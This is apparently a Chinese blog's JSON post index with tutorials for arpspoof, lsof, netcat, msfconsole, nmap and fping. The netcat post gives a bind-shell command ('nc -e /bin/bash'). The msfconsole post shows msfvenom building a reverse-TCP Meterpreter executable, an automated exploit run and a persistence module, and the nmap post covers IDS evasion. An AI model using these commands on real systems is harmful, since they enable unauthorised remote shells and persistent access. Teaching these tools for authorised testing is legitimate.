欺骗工具，常用于中间人攻击（MITM）。通过掌握基本语法和高级用法，可以快速实现网络流量的捕获和篡改，帮助进行网络安全测试和分析。\n","date":"2025-04-21T10:40:37+08:00","permalink":"https://souljian.cn/p/745203237/","title":"Arpspoof命令使用"},{"content":" 一、lsof 简介 lsof（List Open Files）是一个功能强大的命令行工具，用于列出当前系统中所有打开的文件及其相关进程。在 Unix 和 Linux 系统中，几乎所有事物（包括常规文件、目录、网络连接、设备等）都被视为文件，因此 lsof 在多种场景下都非常有用。\n二、安装 lsof 在大多数 Linux 发行版中，lsof 可通过包管理器安装：\nDebian/Ubuntu：\n1 2 sudo apt update sudo apt install lsof CentOS/RHEL：\n1 sudo yum install lsof Arch Linux：\n1 sudo pacman -S lsof 三、基本语法 1 lsof [选项] [文件名或目录] 四、常用选项 （一）按进程过滤 -p \u0026lt;PID\u0026gt;：按进程 ID 过滤。\n1 lsof -p 1234 -c \u0026lt;进程名\u0026gt;：按进程名过滤。\n1 lsof -c sshd -c \u0026lt;进程名1\u0026gt; -c \u0026lt;进程名2\u0026gt;：同时列出多个进程的打开文件。\n1 lsof -c mysql -c apache （二）按用户过滤 -u \u0026lt;用户名\u0026gt;：按用户名过滤。\n1 lsof -u username -u ^\u0026lt;用户名\u0026gt;：排除指定用户的打开文件。\n1 lsof -u ^root （三）按文件名或目录过滤 指定文件名或目录名，列出与之相关的打开文件。\n1 2 lsof /path/to/file lsof /path/to/directory 使用 +D 递归列出目录及其子目录下所有打开的文件。\n1 lsof +D /path/to/directory （四）按网络连接过滤 -i：显示所有网络连接。\n1 lsof -i -i :\u0026lt;端口号\u0026gt;：按端口号过滤。\n1 lsof -i :80 -i \u0026lt;协议\u0026gt;@\u0026lt;IP地址\u0026gt;：按协议和 IP 地址过滤。\n1 lsof -i tcp@192.168.1.100 -i TCP：仅显示 TCP 连接。\n1 lsof -i TCP -i UDP：仅显示 UDP 连接。\n1 lsof -i UDP （五）其他选项 -n：不解析主机名，直接显示 IP 地址。\n-P：不解析端口号，直接显示数字。\n-t：仅显示进程 ID。\n-l：显示文件的 inode 号。\n-a：组合多个条件。\n1 lsof -u username -c process_name 五、使用场景 （一）查找占用特定文件的进程 1 lsof /var/log/syslog 此命令可帮助你找出哪个进程正在使用 /var/log/syslog 文件。\n（二）查找占用特定端口的进程 1 lsof -i :80 此命令可帮助你找出哪个进程正在使用 TCP 端口 80。\n（三）查找某个用户打开的文件 1 lsof -u username 此命令可列出用户 username 打开的所有文件。\n（四）查看某个进程打开的文件 1 lsof -p 1234 此命令可列出进程 ID 为 1234 的所有打开文件。\n（五）查找被删除但仍在使用的文件 1 lsof | grep deleted 此命令可帮助你找出已被删除但仍被进程占用的文件。\n（六）监控文件系统活动 1 lsof +D /path/to/directory 此命令可实时监控指定目录及其子目录下所有打开的文件。\n（七）查找打开的文件数量 1 lsof | wc -l 此命令可统计系统中打开的文件总数。\n（八）识别资源泄漏 1 lsof -p \u0026lt;PID\u0026gt; 此命令可帮助你查找某个进程打开的文件，从而排查资源泄漏问题。\n（九）查看特定类型的文件 1 lsof -U 此命令可列出所有 Unix 域套接字。\n六、高级用法 （一）列出监听的网络连接 1 lsof -i TCP:LISTEN 此命令可列出所有处于监听状态的 TCP 端口。\n（二）列出特定用户的网络连接 1 lsof -a -u username -i 此命令可列出用户 username 的所有网络连接。\n（三）列出特定协议的文件 1 lsof -i TCP:https 此命令可列出所有使用 HTTPS 端口的 TCP 文件。\n（四）重复模式 1 lsof -r 5 -i UDP 此命令每 5 秒输出一次所有正在进行的 UDP 连接，直到手动终止。\n（五）列出特定范围的文件描述符 1 lsof -d 2-3 此命令可列出文件描述符范围为 2-3 的文件。\n七、注意事项 权限问题：某些信息（如其他用户的文件）可能需要管理员权限才能查看。 输出格式：lsof 的输出包含多个字段，如进程 ID、用户、文件描述符等。可以通过 man lsof 查看详细字段说明。 性能影响：在系统文件数量较多时，lsof 的运行可能会稍显缓慢，尤其是在没有过滤条件的情况下。 八、总结 lsof 是一个功能强大的工具，适用于多种场景，包括故障排查、性能监测、资源管理等。通过掌握基本语法和常用选项，可以快速定位文件占用、网络连接等问题。结合过滤条件和其他命令，lsof 的应用场景更加广泛，能够满足复杂的系统管理和调试需求。\n","date":"2025-04-21T10:39:12+08:00","permalink":"https://souljian.cn/p/745203152/","title":"Lsof命令使用"},{"content":"一、简介 nc（Netcat）是一个功能强大的网络工具，用于读写网络连接（TCP 和 UDP）。它常被称为\u0026quot;网络瑞士军刀\u0026quot;，可用于端口扫描、数据传输、远程控制等多种用途。\n二、安装 （一）通过包管理器安装 Debian/Ubuntu：\n1 2 sudo apt update sudo apt install netcat CentOS/RHEL：\n1 sudo yum install nc Arch Linux：\n1 sudo pacman -S inetutils Fedora：\n1 sudo dnf install nc openSUSE：\n1 sudo zypper install netcat-openbsd （二）从源代码编译安装 从官方网站下载 nc 的源代码。\n解压源代码包并进入解压后的目录。\n执行以下命令来编译和安装 nc：\n1 2 3 ./configure make sudo make install （三）验证安装 安装完成后，可以通过运行以下命令来验证 nc 是否安装成功：\n1 nc -h 如果返回 nc 命令的帮助信息，则表示安装成功。\n三、基本语法 1 nc [选项] [主机] [端口] 四、常用选项 选项 说明 -l 使用监听模式，管控传入的资料 -p 设置本地主机使用的通信端口 -s 设置本地主机送出数据包的 IP 地址 -u 使用 UDP 传输协议 -v 显示指令执行过程 -w 设置等待连线的时间 -z 使用 0 输入/输出模式，只在扫描通信端口时使用 五、使用示例 （一）端口扫描 TCP 端口扫描：\n1 nc -zv 192.168.1.1 80-443 扫描目标 IP 地址（192.168.1.1）上的端口 80 到 443，检查是否开放。\nUDP 端口扫描：\n1 nc -zvu 192.168.1.1 53 扫描目标主机的 UDP 端口 53。\n（二）监听端口 TCP 端口监听：\n1 nc -l 8080 在本地监听 8080 端口。\nUDP 端口监听：\n1 nc -u -l 8080 使用 UDP 协议监听 8080 端口。\n（三）数据传输 发送文件：\n1 nc 192.168.1.2 12345 \u0026lt; file.txt 将 file.txt 发送到远程主机的 12345 端口。\n接收文件：\n1 nc -l 12345 \u0026gt; file.txt 在本地监听 12345 端口并接收文件。\n（四）远程命令执行 目标机器上：\n1 nc -lvp 4444 -e /bin/bash 在目标机器上监听 4444 端口，并将 /bin/bash 作为远程命令执行。\n攻击者机器上：\n1 nc 192.168.1.2 4444 连接到目标机器的 4444 端口，获取远程命令执行的 Shell。\n（五）端口转发 本地端口转发：\n1 nc -l 8080 | nc 192.168.1.100 80 将本地 8080 端口的数据转发到远程服务器的 80 端口。\n（六）网络调试 发送 HTTP 请求：\n1 echo -ne \u0026#34;GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\u0026#34; | nc example.com 80 向目标服务器发送 HTTP 请求。\n六、注意事项 权限问题：某些功能（如监听低端口号）可能需要管理员权限。 安全问题：使用远程命令执行功能时需谨慎，避免安全风险。 版本差异：不同版本的 nc（如 netcat、ncat）功能可能有所不同。 安装路径：安装完成后，可能需要将 nc 的路径添加到系统的环境变量中，以便在任意终端中直接使用。 七、总结 nc 是一个功能强大的网络工具，适用于多种场景，包括端口扫描、数据传输、远程控制等。通过掌握基本语法和高级功能，可以快速实现网络通信和数据传输，帮助进行网络管理和故障排查。\n","date":"2025-04-21T10:37:16+08:00","permalink":"https://souljian.cn/p/745203036/","title":"Nc（netcat）命令使用"},{"content":"一、简介 msfconsole 是 Metasploit Framework 的命令行界面，用于执行各种安全测试和渗透测试任务。Metasploit 是一个功能强大的渗透测试工具，提供了丰富的漏洞利用模块、后渗透工具和自动化功能。\n二、安装 Kali Linux（Metasploit 已预装）：\n1 2 sudo apt update sudo apt install metasploit-framework 其他 Linux 发行版： 可以通过 Rapid7 官方网站 获取安装指南。\n三、基本语法 1 msfconsole 四、常用命令 （一）启动 msfconsole 1 msfconsole （二）查找模块 1 search \u0026lt;keyword\u0026gt; 例如：\n1 search apache （三）使用模块 1 use \u0026lt;module\u0026gt; 例如：\n1 use exploit/unix/webapp/apache_mod_cgi （四）设置模块选项 1 set \u0026lt;option\u0026gt; \u0026lt;value\u0026gt; 例如：\n1 2 set RHOSTS 192.168.1.100 set RPORT 80 （五）查看模块选项 1 show options （六）运行模块 1 run （七）退出 msfconsole 1 exit 五、高级用法 （一）自动化攻击 使用 msfconsole 的自动化功能可以快速执行攻击任务。例如：\n1 msfconsole -q -x \u0026#34;use exploit/unix/webapp/apache_mod_cgi; set RHOSTS 192.168.1.100; set RPORT 80; run\u0026#34; （二）生成 Meterpreter 有效载荷 1 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe （三）使用 Meterpreter 会话 1 2 sessions -l sessions -i \u0026lt;session_id\u0026gt; （四）后渗透攻击 1 2 search post use post/windows/manage/persistence （五）利用漏洞 1 2 3 4 5 search exploit use exploit/unix/webapp/apache_mod_cgi set RHOSTS 192.168.1.100 set RPORT 80 run （六）端口扫描 查看端口扫描模块：\n1 search portscan 使用端口扫描模块：\n1 use auxiliary/scanner/portscan/top 查看模块选项：\n1 show options 设置目标 IP：\n1 set RHOSTS 192.168.1.100 设置线程数：\n1 set THREADS 100 执行扫描：\n1 run （七）服务扫描 查看服务扫描模块：\n1 search smb_version 使用服务扫描模块：\n1 use auxiliary/scanner/smb/smb_version 查看模块选项：\n1 show options 设置目标 IP：\n1 set RHOSTS 192.168.1.100 设置线程数：\n1 set THREADS 10 执行扫描：\n1 run 六、注意事项 权限问题：某些功能（如监听低端口号）可能需要管理员权限。 网络环境：某些网络环境可能限制某些模块的使用。 法律问题：未经授权的渗透测试行为可能违反法律法规。 七、总结 msfconsole 是一个功能强大的渗透测试工具，适用于多种安全测试场景，包括漏洞利用、后渗透攻击和自动化攻击。通过掌握基本语法和高级用法，可以快速定位网络中的漏洞并进行安全审计。\n","date":"2025-04-20T23:10:14+08:00","permalink":"https://souljian.cn/p/745161814/","title":"Msfconsole命令使用"},{"content":"一、简介 nmap 是一款开源的网络探测和安全审核工具，可以用来扫描网络主机，确定哪些主机在运行、运行哪些服务以及运行哪个操作系统等信息。它支持多种扫描技术，能够识别网络上的活跃设备、开放端口、运行服务和操作系统类型。\n二、安装 Debian/Ubuntu：\n1 2 sudo apt update sudo apt install nmap CentOS/RHEL：\n1 sudo yum install nmap Arch Linux：\n1 sudo pacman -S nmap 三、基本语法 1 nmap [选项] [目标] 四、常用选项 （一）扫描类型 -sS：TCP SYN 扫描（半开放扫描）。 -sT：TCP 连接扫描。 -sU：UDP 扫描。 -sP：仅进行主机发现。 -sV：服务版本检测。 -O：操作系统检测。 （二）端口指定 -p \u0026lt;端口\u0026gt;：指定扫描的端口范围。\n1 nmap -p 80,443 target_ip -p-：扫描所有 65535 个端口。\n1 nmap -p- target_ip （三）输出选项 -oN \u0026lt;文件\u0026gt;：将扫描结果保存到普通文本文件。\n1 nmap -oN scan_results.txt target_ip -oX \u0026lt;文件\u0026gt;：将扫描结果保存为 XML 格式。\n1 nmap -oX scan_results.xml target_ip -oG \u0026lt;文件\u0026gt;：将扫描结果保存为 Grepable 格式。\n1 nmap -oG scan_results.gnmap target_ip （四）其他选项 -v：详细模式，显示更多信息。\n1 nmap -v target_ip -A：启用操作系统和服务版本检测。\n1 nmap -A target_ip -T \u0026lt;级别\u0026gt;：设置扫描速度（0 最慢，5 最快）。\n1 nmap -T4 target_ip -Pn：跳过主机发现，直接扫描指定主机。\n1 nmap -Pn target_ip 五、高级功能与选项 （一）服务版本检测 使用 -sV 选项可以检测目标主机开放端口上运行的服务及其版本信息。这对于漏洞扫描和服务识别非常有用：\n1 nmap -sV target_ip （二）操作系统检测 nmap 可以通过分析网络堆栈，尝试识别目标主机的操作系统类型和版本：\n1 nmap -O target_ip （三）脚本扫描 nmap 的脚本引擎（NSE）支持数百个脚本，涵盖从服务检测到漏洞扫描、恶意软件检测、Brute-force 攻击等多种用途。例如，使用漏洞扫描脚本集：\n1 nmap --script vuln target_ip （四）扫描速度控制 在高流量或防火墙严格的网络环境中，可以通过 -T 选项调整扫描速度（0为最慢，5为最快）。例如，快速扫描：\n1 nmap -T4 target_ip （五）防火墙规避 nmap 提供了一些技术来规避防火墙和入侵检测系统（IDS），例如使用碎片化数据包（-f）、修改扫描速率（-T0 至 -T5）。\n（六）并发扫描与负载优化 nmap 支持并发扫描和负载优化，以提高扫描效率。例如，禁用主机发现（-Pn）和 DNS 解析（-n）：\n1 nmap -Pn -n target_ip （七）自定义数据包发送 高级用户可以利用 nmap 构建和发送自定义数据包，例如通过 --data-length、--data-string 等参数。\n（八）网络拓扑发现与可视化 nmap 可以结合 traceroute 绘制网络拓扑图，展示网络设备之间的连接关系。\n（九）漏洞扫描与安全审计 借助 NSE 脚本，nmap 可以进行各种漏洞扫描，包括已知漏洞的检测和配置错误的识别。\n（十）结果输出与报告生成 nmap 支持多种结果输出格式，如标准输出、XML 格式（-oX）、Grepable 格式（-oG）。\n六、使用示例 （一）基本扫描 扫描单个主机：\n1 nmap 192.168.1.100 扫描多个主机：\n1 nmap 192.168.1.1-10 扫描特定端口：\n1 nmap -p 80,443 192.168.1.100 （二）高级扫描 服务版本检测：\n1 nmap -sV 192.168.1.100 操作系统检测：\n1 nmap -O 192.168.1.100 快速扫描：\n1 nmap -F 192.168.1.100 扫描网络中的所有主机：\n1 nmap -sP 192.168.1.0/24 （三）脚本扫描 使用 NSE 脚本进行漏洞扫描：\n1 nmap --script vuln 192.168.1.100 使用特定脚本：\n1 nmap --script http-title 192.168.1.100 （四）防火墙规避 使用碎片化数据包：\n1 nmap -f 192.168.1.100 调整扫描速度：\n1 nmap -T0 192.168.1.100 （五）并发扫描与负载优化 禁用主机发现和 DNS 解析：\n1 nmap -Pn -n 192.168.1.100 七、注意事项 权限问题：某些扫描类型（如 -sS）需要管理员权限才能运行。 网络环境：某些网络环境可能限制 ICMP 请求或特定端口的扫描。 扫描速度：在高流量或防火墙严格的网络环境中，需要调整扫描速度以避免被检测到。 结果输出：使用 -oN、-oX、-oG 等选项保存扫描结果，便于后续分析。 八、总结 nmap 是一个功能强大的网络扫描工具，适用于多种场景，包括网络发现、端口扫描、服务检测、操作系统识别和漏洞扫描。通过掌握基本语法和高级功能，可以快速定位网络中的设备和服务，帮助进行网络管理和安全审计。\n","date":"2025-04-20T22:59:14+08:00","permalink":"https://souljian.cn/p/745161154/","title":"Nmap命令使用"},{"content":" 一、简介 fping 是一个用于发送 ICMP Echo 请求的工具，类似于 ping，但它可以同时对多个主机进行 ICMP Echo 请求，并且输出结果更加简洁。它特别适合用于批量检测主机的存活性。\n二、安装 Debian/Ubuntu：\n1 2 sudo apt update sudo apt install fping CentOS/RHEL：\n1 sudo yum install fping Arch Linux：\n1 sudo pacman -S fping 三、基本语法 1 fping [选项] [主机列表] 四、常用选项 -a：仅显示存活的主机。 -b：设置 ping 数据包的大小（默认为 56 字节）。 -c：设置每个目标的 ping 次数（默认为 1）。 -f：从文件获取目标列表（不能与 -g 同时使用）。 -g：通过指定起始和结束地址来生成目标列表，可以是网段。 -l：循环发送 ping。 -u：显示不可到达的目标。 -s：显示统计信息，包括发送和接收的 ICMP Echo 请求数量。 五、使用示例 （一）基本用法 ping 单个主机：\n1 fping 192.168.1.100 发送 ICMP Echo 请求到 192.168.1.100。\nping 多个主机：\n1 fping 192.168.1.1 192.168.1.2 192.168.1.3 同时对多个主机发送 ICMP Echo 请求。\nping 网段中的所有主机：\n1 fping -g 192.168.1.0/24 生成并扫描 192.168.1.0/24 网段中的所有主机。\n仅显示存活的主机：\n1 fping -a 192.168.1.1 192.168.1.2 192.168.1.3 仅显示响应 ICMP Echo 请求的主机。\n（二）高级用法 显示统计信息：\n1 fping -s 192.168.1.1 192.168.1.2 192.168.1.3 发送 ICMP Echo 请求并显示统计信息，包括发送和接收的 ICMP Echo 请求数量。\n指定发送次数和间隔：\n1 fping -c 3 -i 100 192.168.1.100 对 192.168.1.100 发送 3 次 ICMP Echo 请求，每次请求间隔 100 毫秒。\n从文件中读取主机列表：\n1 fping -f hosts.txt 从文件 hosts.txt 中读取主机列表并进行 ICMP Echo 请求。\n显示存活的主机并统计：\n1 fping -a -s 192.168.1.0/24 扫描 192.168.1.0/24 网段中的所有主机，仅显示存活的主机并显示统计信息。\n六、注意事项 权限问题：fping 需要管理员权限才能发送 ICMP 请求。 网络环境：某些网络环境可能限制 ICMP 请求，导致 fping 无法正常工作。 输出格式：fping 的输出格式较为简洁，适合批量检测主机存活性。 七、总结 fping 是一个功能强大的工具，特别适合用于批量检测主机的存活性。通过掌握基本语法和常用选项，可以快速定位网络中的存活主机。结合 -s 参数，可以获取更详细的统计信息，帮助分析网络状态。\n","date":"2025-04-20T20:49:53+08:00","permalink":"https://souljian.cn/p/745153393/","title":"Fping命令使用"}]